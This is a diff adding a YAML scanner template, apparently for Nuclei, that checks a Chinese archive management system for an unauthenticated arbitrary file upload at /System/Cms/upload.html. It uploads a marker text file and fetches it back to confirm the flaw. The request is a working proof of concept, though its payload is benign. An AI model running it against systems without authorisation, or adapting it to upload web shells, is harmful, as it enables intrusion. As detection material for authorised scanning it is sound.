@@ -1,0 +1,77 @@
+id: poc-yaml-thams-system-upload
+
+info:
+  name: 紫光档案管理系统upload.html接口存在任意文件上传漏洞
+  author: ProjectDiscoveryAI
+  severity: critical
+  tags: arbitrary-file-upload
+  description: |
+    This template detects an arbitrary file upload vulnerability in 紫光档案管理系统 via the /System/Cms/upload.html endpoint.
+
+variables:
+  random_string: '{{to_lower(rand_base(10))}}'
+
+http:
+  - id: upload-file
+    method: POST
+    path:
+      - "/System/Cms/upload.html?token="
+    headers:
+      Content-Type: multipart/form-data; boundary=c8fe659c69f6f5f6a7edaf5e1cca5d34
+    body: |
+      --c8fe659c69f6f5f6a7edaf5e1cca5d34
+      Content-Disposition: form-data; name="files[]"; filename="1.txt"
+      
+      This website has a vulnerability!!!+{{random_string}}
+      --c8fe659c69f6f5f6a7edaf5e1cca5d34
+      Content-Disposition: form-data; name="userID"
+      
+      admin
+      --c8fe659c69f6f5f6a7edaf5e1cca5d34
+      Content-Disposition: form-data; name="fondsid"
+      
+      1
+      --c8fe659c69f6f5f6a7edaf5e1cca5d34
+      Content-Disposition: form-data; name="comid"
+      
+      1
+      --c8fe659c69f6f5f6a7edaf5e1cca5d34
+      Content-Disposition: form-data; name="token"
+      
+      1
+      --c8fe659c69f6f5f6a7edaf5e1cca5d34--
+    matchers-condition: and
+    matchers:
+      - type: word
+        words:
+          - "savename"
+          - "savepath"
+      - type: regex
+        regex:
+          - '\\"savename\\":\\"(?P<filename>.*?).txt'
+          - 'cms\\\\\\/(?P<date>.*?)\\\\\\/'
+
+    extractors:
+      - type: regex
+        name: filename
+        internal: true
+        group: 1
+        regex:
+          - '\\"savename\\":\\"(?P<filename>.*?).txt'
+      - type: regex
+        name: date
+        internal: true
+        group: 1
+        regex:
+          - 'cms\\\\\\/(?P<date>.*?)\\\\\\/'
+
+  - id: verify-upload
+    method: GET
+    path:
+      - "/uploads/company1/fonds1/cms/{{date}}/{{filename}}.txt"
+    matchers-condition: and
+    matchers:
+      - type: word
+        words:
+          - "This website has a vulnerability"
+          - "{{random_string}}"
